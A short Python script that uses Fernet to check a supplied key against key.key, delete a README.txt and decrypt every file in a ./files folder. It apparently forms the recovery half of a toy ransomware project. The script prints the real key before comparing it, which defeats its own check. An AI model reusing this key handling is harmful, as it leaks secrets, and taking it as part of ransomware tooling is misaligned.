from cryptography.fernet import Fernet
import os


def load_key():
    return open('key.key', 'rb').read()


def decrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)

        with open(item, 'wb') as file_write:
            file_write.write(decrypted_data)


#if __name__ == '__main__':
def decrypt_files(input_key):
    key = load_key()
    print(key.decode('UTF-8'))
    
    if key.decode('UTF-8') != input_key:
      return False
    
    path_to_encrypt = './files'
    os.remove(path_to_encrypt + '/' + 'README.txt')

    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '/' + item for item in items]

    decrypt(full_path, key)
    return True

